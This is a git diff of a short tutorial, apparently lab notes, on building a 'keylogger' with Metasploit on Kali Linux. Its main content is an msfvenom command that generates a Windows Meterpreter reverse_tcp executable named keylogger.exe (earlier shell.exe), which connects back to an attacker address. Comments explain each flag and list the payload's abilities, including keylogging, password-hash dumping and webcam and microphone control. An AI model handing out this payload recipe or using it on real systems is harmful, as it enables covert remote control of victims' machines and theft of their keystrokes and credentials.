@@ -1,15 +1,25 @@
-#Building the keylogger using Metasploit-framework
+Building the keylogger using Metasploit-framework
 
 PART 1
 Log in to kali linux software
-The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework 
-**https://www.offsec.com/metasploit-unleashed/meterpreter-basics/**
+The aim is to create a payload called Meterpreter using Inbuilt Metasploit-framework (see- https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+
+    ## Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code ##
+
+Using Meterpreter to generate an executable called keylogger.exe as illustrated before
+
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.2 LPORT=444 -f exe -o keylogger.exe
+
+    # p - payload (windows/x64/meterpreter/reverse_tcp) 
+    # windows/meterpreter/reverse_tcp is one of the most powerful features the Metasploit Framework has to offer
+    # It allows you to remotely control the file system, sniff, keylog, hashdump, perform network pivoting, control the webcam and microphone
+    #LHOST - Listen Address (Threat actor IP address)
+    #LPORT - Listen port (The default is 444, It is advisable to change to another value)
+    #f - To outpute the executable file in exe (Window extension)
+    #0 - To outpute the executable file name to keylogger.exe
+    
 
 
 
- Meterpretershell
-   kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(HACKERS iP ADDRESS) LPORT=444 -f exe -o shell.exe (You can get the lists of payload in metasploitable)
-   p means- payload 
-   f means - output files in exe
-   0 means - output name which is shell.exe
-   How to make share folder btw windows and the kalis (solved)
+ 
